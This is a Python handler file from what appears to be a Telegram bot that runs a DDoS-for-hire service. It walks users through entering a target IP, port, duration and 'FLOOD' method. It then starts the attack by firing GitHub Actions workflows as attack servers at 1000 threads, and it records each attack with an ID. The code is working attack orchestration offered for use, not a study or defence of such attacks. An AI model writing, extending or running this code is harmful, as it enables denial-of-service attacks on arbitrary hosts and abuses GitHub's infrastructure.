# handlers/launch.py
from pyrogram import filters
from pyrogram.types import Message, CallbackQuery
from config import OWNER_ID, WORKFLOW_COUNT
from database import is_active, is_admin, add_attack, add_log
from keyboards import attack_confirm, method_select, stop_confirm, main_menu
from services.github import launch_all, get_all_runs, test_connection
from utils.validators import valid_ip, valid_port, valid_duration
import time
import asyncio
from datetime import datetime

import main as main_module

attack_state = {}

def register(app):
    
    @app.on_callback_query(filters.regex("^launch$"))
    async def launch_start(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if not (user_id == OWNER_ID or is_admin(user_id) or is_active(user_id)):
            return await cb.answer("❌ No access", show_alert=True)
        
        attack_state[user_id] = {"step": "ip"}
        await cb.message.edit_text(
            "**📝 Send target IP address:**\n\n"
            "**Example:** `1.1.1.1`\n\n"
            "**Send /cancel to cancel**"
        )
    
    @app.on_message(filters.command("cancel") & filters.private)
    async def cancel_cmd(client, message: Message):
        user_id = message.from_user.id
        if user_id in attack_state:
            del attack_state[user_id]
        await message.reply("❌ **Cancelled**")
    
    @app.on_message(filters.private & filters.text &
                    ~filters.command(["start", "cancel"]))
    async def attack_input(client, message: Message):
        user_id = message.from_user.id
        if user_id not in attack_state:
            return
        
        state = attack_state[user_id]
        text = message.text.strip()
        step = state["step"]
        
        if step == "ip":
            if not valid_ip(text):
                return await message.reply("❌ **Invalid IP**, try again:")
            state["ip"] = text
            state["step"] = "port"
            return await message.reply(
                f"**✅ IP:** `{text}`\n\n"
                f"**📝 Send target PORT:**\n\n"
                f"**Example:** `80` or `443`"
            )
        
        if step == "port":
            if not valid_port(text):
                return await message.reply("❌ **Invalid port**, try again:")
            state["port"] = int(text)
            state["step"] = "duration"
            return await message.reply(
                f"**✅ Port:** `{text}`\n\n"
                f"**⏰ Send duration (seconds):**\n\n"
                f"**Example:** `300`\n"
                f"**Max:** `21000`"
            )
        
        if step == "duration":
            if not valid_duration(text):
                return await message.reply("❌ **Max 21000**, try again:")
            state["duration"] = int(text)
            state["step"] = "method"
            return await message.reply(
                f"**✅ Duration:** `{text}s`\n\n"
                f"**⚡ Select method:**",
                reply_markup=method_select()
            )
    
    @app.on_callback_query(filters.regex("^method_"))
    async def method_selected(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if user_id not in attack_state:
            return await cb.answer("No attack pending")
        
        method = cb.data.replace("method_", "").upper()
        attack_state[user_id]["method"] = f"{method} FLOOD"
        state = attack_state[user_id]
        
        await cb.message.edit_text(
            f"**🎯 Confirm Attack**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"**🌐 Target:** `{state['ip']}:{state['port']}`\n"
            f"**⏰ Duration:** `{state['duration']}s`\n"
            f"**⚡ Method:** {state['method']}\n"
            f"**🖥️ Servers:** `{WORKFLOW_COUNT}`\n\n"
            f"**⚠️ Confirm?**",
            reply_markup=attack_confirm()
        )
    
    @app.on_callback_query(filters.regex("^confirm_attack$"))
    async def confirm_attack(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if user_id not in attack_state:
            return await cb.answer("No attack pending")
        
        state = attack_state.pop(user_id)
        await cb.message.edit_text("**⏳ Starting Attack...**")
        
        connection_ok = test_connection()
        if not connection_ok:
            add_log("attack_failed", user_id, "GitHub connection failed")
            return await cb.message.edit_text(
                "**❌ FAILED**",
                reply_markup=main_menu()
            )
        
        count = launch_all(state["ip"], state["port"], 1000)
        await asyncio.sleep(5)
        
        runs = get_all_runs()
        running = sum(
            1 for wf, s in runs.items()
            if wf.startswith("bot") and s in ["in_progress", "queued"]
        )
        
        if running == 0:
            add_log("attack_failed", user_id, "Workers not started")
            return await cb.message.edit_text(
                "**❌ FAILED**",
                reply_markup=main_menu()
            )
        
        main_module.current_target = {
            "ip": state["ip"],
            "port": state["port"],
            "threads": 1000
        }
        main_module.watchdog_enabled = True
        
        attack_id = f"atk_{user_id}_{int(time.time())}"
        add_attack(attack_id, {
            "user_id": user_id,
            "ip": state["ip"],
            "port": state["port"],
            "duration": state["duration"],
            "method": state["method"],
            "servers": running,
            "started_at": datetime.now().isoformat(),
            "status": "running"
        })
        add_log("attack_started", user_id, f"{state['ip']}:{state['port']}")
        
        await cb.message.edit_text(
            f"**🎯 ATTACK STARTED!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"**🆔 Attack ID:** `{attack_id}`\n"
            f"**🌐 Target:** `{state['ip']}:{state['port']}`\n"
            f"**⏰ Duration:** `{state['duration']}s`\n"
            f"**⚡ Method:** {state['method']}\n"
            f"**🖥️ Servers:** `{running}`",
            reply_markup=stop_confirm()
        )
    
    @app.on_callback_query(filters.regex("^cancel_attack$"))
    async def cancel_attack(client, cb: CallbackQuery):
        attack_state.pop(cb.from_user.id, None)
        await cb.message.edit_text("❌ **Cancelled**")